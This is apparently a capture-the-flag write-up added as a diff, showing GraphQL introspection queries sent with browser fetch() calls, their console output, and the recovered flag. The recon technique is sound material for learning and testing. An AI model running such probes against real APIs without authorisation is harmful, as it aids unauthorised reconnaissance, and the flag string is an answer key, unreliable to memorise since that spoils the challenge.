@@ -1,0 +1,76 @@
+it's a graphql api
+
+graphql requests very specific fields, but allows us to discover what sort of data we can request
+
+https://graphql.org/learn/introspection/
+
+{
+  __schema {
+    types {
+      name
+    }
+  }
+}
+
+fetch("/graphql", { headers: { "Content-Type": "application/json" }, method: "POST", body: JSON.stringify({ query: "{ __schema { types { name } } }" }) }).then(res => res.json()).then(console.log)
+
+{data: {…}}
+  data:
+    __schema:
+      types: Array(12)
+        0: {name: "ctf"}
+        1: {name: "String"}
+        2: {name: "Query"}
+        3: {name: "Boolean"}
+        4: {name: "__Schema"}
+        5: {name: "__Type"}
+        6: {name: "__TypeKind"}
+        7: {name: "__Field"}
+        8: {name: "__InputValue"}
+        9: {name: "__EnumValue"}
+        10: {name: "__Directive"}
+        11: {name: "__DirectiveLocation"}
+        length: 12
+        __proto__: Array(0)
+      __proto__: Object
+    __proto__: Object
+  __proto__: Object
+
+
+{
+  __type(name: "ctf") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+
+fetch("/graphql", { headers: { "Content-Type": "application/json" }, method: "POST", body: JSON.stringify({ query: '{ __type(name: "ctf") { name fields { name type { name kind } } } }' }) }).then(res => res.json()).then(console.log)
+
+
+{data: {…}}
+  data:
+    __type:
+      fields: Array(1)
+        0:
+          name: "graphql_makes_rec0n_easy_c237d2a3"
+          type:
+            kind: "SCALAR"
+            name: "String"
+            __proto__: Object
+          __proto__: Object
+        length: 1
+        __proto__: Array(0)
+      name: "ctf"
+      __proto__: Object
+    __proto__: Object
+  __proto__: Object
+
+
+ctf{graphql_makes_rec0n_easy_c237d2a3}
